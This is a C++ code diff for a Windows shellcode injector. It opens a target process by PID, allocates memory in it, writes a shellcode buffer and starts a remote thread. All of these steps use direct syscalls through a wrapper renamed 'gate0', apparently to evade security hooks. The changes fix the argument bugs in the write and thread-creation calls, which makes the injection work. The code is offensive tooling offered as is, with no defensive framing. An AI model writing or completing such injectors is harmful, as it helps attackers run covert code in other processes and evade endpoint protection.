@@ -1,5 +1,6 @@
 #include "ntapi.hpp"
 #include "syscalls.hpp"
+#include <minwinbase.h>
 #include <ntdef.h>
 #include <stdexcept>
 #include <string>
@@ -31,7 +32,7 @@ int main(int argc, char *argv[]) {
   if (argc != 2)
     throw std::runtime_error("Wrong arg count\n");
 
-  spi::syscalls syscalls;
+  gate0::syscalls syscalls;
   DWORD PID = std::stoi(argv[1]);
   HANDLE processHandle = NULL;
   OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), NULL};
@@ -42,6 +43,7 @@ int main(int argc, char *argv[]) {
     throw std::runtime_error(
         "Couldn't get a handle on the process, failed with: " +
         std::to_string(status));
+
   PVOID buf = NULL;
   size_t regionSize = sizeof(shellcode);
   status = syscalls.Call("NtAllocateVirtualMemory", processHandle, &buf, 0,
@@ -54,8 +56,8 @@ int main(int argc, char *argv[]) {
         std::to_string(status));
   }
 
-  status = syscalls.Call("NtWriteVirtualMemory", processHandle, &buf,
-                         sizeof(shellcode), NULL);
+  status = syscalls.Call("NtWriteVirtualMemory", processHandle, buf,
+                         (void *)&shellcode, sizeof(shellcode), NULL);
   if (!NT_SUCCESS(status)) {
     syscalls.Call("NtClose", processHandle);
     throw std::runtime_error(
@@ -66,16 +68,16 @@ int main(int argc, char *argv[]) {
   HANDLE threadHandle = NULL;
   status =
       syscalls.Call("NtCreateThreadEx", &threadHandle, THREAD_ALL_ACCESS,
-                    objectAttrs, processHandle, buf, NULL, 0, 0, 0, 0, NULL);
+                    &objectAttrs, processHandle, buf, NULL, 0, 0, 0, 0, NULL);
   if (!NT_SUCCESS(status)) {
     syscalls.Call("NtClose", processHandle);
     throw std::runtime_error(
-        "Couldn't get handle to the process, failed with: " +
+        "Couldn't get create handle in the the process, failed with: " +
         std::to_string(status));
   }
 
-  syscalls.Call("WaitForSingleObject", threadHandle);
+  syscalls.Call("NtWaitForSingleObject", threadHandle, INFINITE);
 
-  syscalls.Call("NtClose", processHandle);
   syscalls.Call("NtClose", threadHandle);
+  status = syscalls.Call("NtClose", processHandle);
 }
